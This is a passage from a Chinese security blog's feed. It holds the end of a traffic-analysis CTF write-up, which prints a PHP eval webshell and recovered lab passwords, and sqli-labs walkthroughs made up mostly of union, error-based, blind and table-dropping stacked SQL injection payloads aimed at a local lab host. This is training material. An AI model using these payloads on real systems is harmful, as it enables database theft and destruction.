class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p><p> 这个我找得有点久，因为答案在最后，中间还有其他可以登陆上去的用户有一个还像是人事，还有两外一个好像是设么simple啥的，看了这整个包，发现simple这个账号有好几次改密码的操作，人事也登陆了几次，这些混淆都给这题提高难度，如果你真的仔细分析这个包的话就会发现，这里面黑客是大概爆破了几次，中间还尝试了一波SQL注入，而且爆破的过程都是用的admin账户，这也暗示了为什么最后的登陆的用户名是admin了，这里的话登陆成功可以看长度，对比爆破跟正常人事的登录，成功的话一般长度都是750+，没成功的话一般都是730+<br><a href="https://imgchr.com/i/Pj06j1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj06j1.md.png" alt="Pj06j1.md.png"></a><br>所以第三题的答案是<code>admin/admin!@#pass123</code></p><h4 id="4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码"><a href="#4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码" class="headerlink" title="4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码"></a>4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</h4><p>通常webshell都会有明显的关键字比如eval、assert之类的，还有各种回调函数就不多说了。<br>我们这里也是一样的套路<br><code>ip.src == 192.168.94.59 and http contains &quot;eval&quot;</code> 一看这不太正常的文件名，有很大机会就是webshell了，而且里面的内容含有z1这样的参数很大可能性就是菜刀连接的流量，所以文件名是<code>/image/article/a.php</code><br><a href="https://imgchr.com/i/Pj02B6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj02B6.md.png" alt="Pj02B6.md.png"></a></p><p>所以这题的答案是<br><code>&lt;?php @eval([1234]);?&gt;</code>的base64编码</p><h4 id="5、黑客在robots-txt中找到的flag是什么"><a href="#5、黑客在robots-txt中找到的flag是什么" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么"></a>5、黑客在robots.txt中找到的flag是什么</h4><p>正常操作<code>http contains &quot;robots.txt&quot;</code>然后追踪流就好了<br><a href="https://imgchr.com/i/Pj0I9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0I9H.md.png" alt="Pj0I9H.md.png"></a><br>这题的答案就是上图的flag</p><h4 id="6、黑客找到的数据库密码是多少"><a href="#6、黑客找到的数据库密码是多少" class="headerlink" title="6、黑客找到的数据库密码是多少"></a>6、黑客找到的数据库密码是多少</h4><p>对于这题的数据库操作，先把马给过滤出来，然后再从里面找他的response，因为这里黑客是通过马对数据库操作的<br>可以先标记一下<code>a.php</code>第一次出现的地方，然后过滤http一条条去看他们的response就可以了，要是想详细一点的话可以加上db等字样，这就是做题时候的一些小技巧了。。可能恰好一样的效率有点低<br><a href="https://imgchr.com/i/Pj0XE8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0XE8.md.png" alt="Pj0XE8.md.png"></a><br>所以这题的答案就是<code>e667jUPvJjXHvEUv</code></p><h4 id="7、黑客在数据库中找到的hash-code是什么"><a href="#7、黑客在数据库中找到的hash-code是什么" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么"></a>7、黑客在数据库中找到的hash_code是什么</h4><p>这个题目明显的就是说在数据库里面找到的hash_code，但是在第一个包里面使用<code>http contains &quot;hsah_code&quot;</code>只找到一个响应报文，里面什么都找不到，这时候我们别忘了有第二个包的存在，我就是经常忘了。。这种做题习惯得改改，太浮躁，一旦发现没有就不做了。。。<br>我们来对比一下两个包的协议分级，很明显第二包里面大多数都是mysql的操作，所以很大可能性就是这个包里面存在我们要的答案<br>第一个包应用层大部分都是html的响应<br><a href="https://imgchr.com/i/PjBpgs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBpgs.md.png" alt="PjBpgs.md.png"></a><br>而第二个包明显了，直接在tcp协议上执行的Mysql操作<br><a href="https://imgchr.com/i/PjB9vn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB9vn.md.png" alt="PjB9vn.md.png"></a><br>我们可以在第二个包里面用mysql的过滤，如果是想搜索执行语句的话最好这样子，如：mysql.query contains “SELECT”<br>类似的模糊匹配<br><code>mysql contains &quot;hash_code&quot;</code><br>然后随便找个response追踪流看一下，发现答案<br><a href="https://imgchr.com/i/PjBiD0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBiD0.md.png" alt="PjBiD0.md.png"></a><br>这题答案是<code>d1c029893df40cb0f47bcf8f1c3c17ac</code></p><h4 id="8、黑客破解了账号ijnu-test-com得到的密码是什么"><a href="#8、黑客破解了账号ijnu-test-com得到的密码是什么" class="headerlink" title="8、黑客破解了账号ijnu@test.com得到的密码是什么"></a>8、黑客破解了账号<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>得到的密码是什么</h4><p>这一题一开始我还以为答案在mail的那两个包里面，结果还是在对sql操作的那个包上面，上来就直接<code>http contains &quot;ijnu@test.com&quot;</code>啥都没发现，这题目感觉出题没说得太明白。。<br>后面就用<code>tcp contains &quot;ijnu@test.com&quot;</code>把包筛出来，并且追踪流就行了，当然这题也可以用<code>mysql contains &quot;ijnu@test.com&quot;</code> 把包筛出来<br>一样的效果<br><a href="https://imgchr.com/i/PjBV5F" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBV5F.md.png" alt="PjBV5F.md.png"></a><br>这题明显密码经过MD5加密的，所以这题得去somd5上解密<br>这题的答案是<code>edc123!@#</code></p><h4 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</h4><p>在webone的那个包里面直接搜索就可以得到<br><code>http contains &quot;eth&quot;</code><br><a href="https://imgchr.com/i/PjBm8J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBm8J.md.png" alt="PjBm8J.md.png"></a><br>或者你也可以直接从webtwo的包里面直接看到内网ip，这也对应了题目后面内网渗透之后，用vpn连接的过程<br>也就是从<code>192.168.32.189(内网地址)-&gt;10.3.3.100(连接vpn后重新分配的内网地址)</code><br>所以这题的答案就是<code>10.3.3.100</code></p><h4 id="10、黑客使用了什么账号登陆了mail系统（形式-username-password）"><a href="#10、黑客使用了什么账号登陆了mail系统（形式-username-password）" class="headerlink" title="10、黑客使用了什么账号登陆了mail系统（形式: username/password）"></a>10、黑客使用了什么账号登陆了mail系统（形式: username/password）</h4><p>既然说是mail系统那我们就在mail的两个包里面寻求答案，在mailtwo里面输入<code>http.request.method == &quot;POST&quot; and http contains &quot;password&quot;</code><br>出现很多相同username不同密码的请求，很有可能是在爆破mail系统，在mailtwo1这一个包里面同样的过滤还存在几条成立请求，对比一下时间，这应该是mailtwo还没爆破完mailtwo1这个包继续爆破，在mailtwo包里面的序号28的信息里面对应下面的几条response，发现一名叫wenwenni的人应该是登录成功的，经过了一个check的过程，</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> loginCheck = <span class="function"><span class="keyword">function</span>(<span class="params">form</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(form.username.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.username.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(form.password.value == <span class="string">""</span>) &#123;</span><br><span class="line">           alert(<span class="string">"..........................."</span>);</span><br><span class="line">           form.password.focus();</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.pars</span><br></pre></td></tr></table></figure><p>然后回显下面的信息<br><img src="https://s1.ax1x.com/2018/08/30/PjBQDx.png" alt="PjBQDx.png"><br>所以感觉应该有这样的重点字在里面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; and ip.addr==192.168.94.59</span><br></pre></td></tr></table></figure><p>于是乎过滤，但是第一个包里面太多了，这一题其实我也不怎么确定，为什么与这么多success的还得继续爆破下去？希望有大佬能讲一讲。。。。<br>之鞥按照常规套路，把在mailtwo1包里面的筛出来的最后一个标记一下，再过滤回http，再来<code>ctrl+shift+N</code>跳到标记处，然后往回找有关登录的请求，找到的第一个请求。。。<br><a href="https://imgchr.com/i/PjBlb6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBlb6.md.png" alt="PjBlb6.md.png"></a></p><p>那个密码需要AES解密，利用上面的算法求出key大概是。。。个人感觉这题最有难度<br><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p><p>解密出来的结果跟第三题的答案一样。。。。。后来看到有人说这是社工手段，直接套第三题答案，有意思有意思。。。。</p><h4 id="11、黑客获得的vpn-ip是多少"><a href="#11、黑客获得的vpn-ip是多少" class="headerlink" title="11、黑客获得的vpn,ip是多少"></a>11、黑客获得的vpn,ip是多少</h4><p>最后一题在vpntwo这个包里面直接点击统计-&gt;端点，又学到了一种方法<br>看到发包最多的是<code>10.3.4.3</code><br><a href="https://imgchr.com/i/PjB8UO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB8UO.md.png" alt="PjB8UO.md.png"></a><br>所以这个答案就是<code>10.3.4.3</code></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>感觉流量分析还是有点套路的，第一点就是多用点contains语句，模糊匹配一下，关键字靠自己的灵活性以及分析过程得出的结论，个人感觉大部分题目会给出，比如的话有小马上传的时候，你会想到会存在关键字，比如eval,assert之类的东西吗，别人用拼接方式传的马那就另当别论了。。但是还是可以通过菜刀的一些标志来识别的，例如&gt;||&lt;之类符号，2333<br>第二就是各种自动化扫描器的指纹特征，还是得记一下，有点用，第三就是可以通过统计去发现某些ip的发包次数，从而确定可疑ip</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(四)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-4/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-4/</id>
    <published>2018-08-29T12:01:56.000Z</published>
    <updated>2018-08-29T12:15:56.261Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，<a id="more"></a>超过次数就会重新安排<br>代码审计发现是简单的单引号闭合</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;XG5G593V9H&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-54/?id=-1&apos; union select 1,secret_0IMA,3 from XG5G593V9H where id=1%23</span><br></pre></td></tr></table></figure><p>提交获得的信息重置刷新次数</p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这次变成了14次<br>先构造测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=1) %23</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;8753JZ68TI&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-55/?id=-1) union select 1,secret_UL8C,3 from 8753JZ68TI %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>构造一下<br><code>http://192.168.100.105/sqlilabs/Less-56/?id=1&quot; %23</code>回显成功后来一直拿他试结果失败了<br>看了源代码才知道原来是括号+单引号的闭合<br>找了一下原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure><p>在数据库中执行确实能够查到数据，那么问题在哪呢？</p><p>查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如<code>‘1”#’</code>转化为数字值为<code>1</code>，如果是<code>‘11fads’</code>则为<code>11</code>，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) %23</span><br></pre></td></tr></table></figure><p>这样才对<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;HVL992XP27&apos;%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-56/?id=-1&apos;) union select 1,secret_E2BQ,3 from HVL992XP27%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>尝试一下闭合<br><code>http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,2,3 %23</code>发现这个有回显，常规套路<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;YRA6E572GR&apos; %23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-57?id=-1&quot; union select 1,secret_LA1G,3 from YRA6E572GR %23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这一关变成了5次<br>但是一侧就测试出来是单引号的闭合<br>执行以后发现不可以用union注入。。。因为不返回任何有数据库里面的信息<br>这段代码对其进行了处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br></pre></td></tr></table></figure><p>下面有报错我们可以利用报错注入<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;XXQT0FJQL2&apos;),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-58/?id=1&apos; and updatexml(1,concat(0x7e,(select secret_LVSS from XXQT0FJQL2),0x7e),1) --+</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>同样的报错注入，只需要加个注释，什么单引号双引号闭合都没有<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;CA4PGB5VU5&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-59/?id=1 and updatexml(1,concat(0x7e,(select secret_O5UY from CA4PGB5VU5),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>提交重置次数</p><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>这一次是<code>双引号+括号</code>的闭合<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;ZIYD79H66Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-60/?id=1&quot;) and updatexml(1,concat(0x7e,(select secret_JIPP from ZIYD79H66Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>此题完结</p><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这次是单引号+两个括号的闭合，也是够变态的<br>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;0NCH5HWI5Q&apos;),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>爆详细信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-61/?id=1&apos;)) and updatexml(1,concat(0x7e,(select secret_6IKU from 0NCH5HWI5Q),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>完结</p><h3 id="Less-62-Less65"><a href="#Less-62-Less65" class="headerlink" title="Less-62-Less65"></a>Less-62-Less65</h3><p>都是一样的都需要盲注，但是给的次数太少，很难跑出来，等我算法学得好一点再去把脚本写出来吧</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>终于把这个SQL注入的平台的题目给做完了，最近感冒难受的一批。。。撒花~~~</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-54&quot;&gt;&lt;a href=&quot;#Less-54&quot; class=&quot;headerlink&quot; title=&quot;Less-54&quot;&gt;&lt;/a&gt;Less-54&lt;/h3&gt;&lt;p&gt;从这一关开始就开始限制次数，而且数据库也换成了challenge，表名是随机的，
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(三)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-3/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-3/</id>
    <published>2018-08-29T12:01:31.000Z</published>
    <updated>2018-08-29T12:15:59.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>从这一关开始其实就是堆叠注入，就是用分号连接两个不同的语句，然后执行这几条语句，进行增删改查，<a id="more"></a>但是比赛中是不大会用的，但是对于这几个环境我还是偏向union注入所以我还是以union注入的方式显示</p><p>换了mysqli的连接方式，但是换汤不换药<br>直接单引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=-1&apos; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>报错尝试一下 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-38/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><p>这个题直接注释掉后面的部分就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-39/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><p>普通的union注入就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1234&apos;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>也可以尝试一下盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-40/?id=1&apos;) and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><p>union注入也可以，盲注也可以<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-41/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-41/?id=1 and ascii(substr(database(),1,1))&gt;114 %23</span><br></pre></td></tr></table></figure><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><p>这个题目查看源码你会发现登陆页面的password是没有过滤好的，我么可以利用此处进行堆叠注入增加，我们可以利用这点直接删库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><p>跟上一题一样password没有过滤<br>只是查询的语句改变了，我么需要闭合括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;);drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><p>跟上一题同样的思路，只是需要单引号闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname = 0ver</span><br><span class="line">passwd = 123&apos;;drop table 0ver#</span><br></pre></td></tr></table></figure><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><p>感觉跟43题没啥区别啊。。。</p><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>从这一关开始正式进入order by注入<br>查看一下源码语句是这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users ORDER BY $id"</span>;</span><br></pre></td></tr></table></figure><p>order by利用的三种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、直接添加注入语句 ?sort=(select ******)</span><br><span class="line">2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。</span><br><span class="line">3、利用and，例如?sort=1 and (加sql语句)</span><br></pre></td></tr></table></figure><p>这一题目可以直借用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 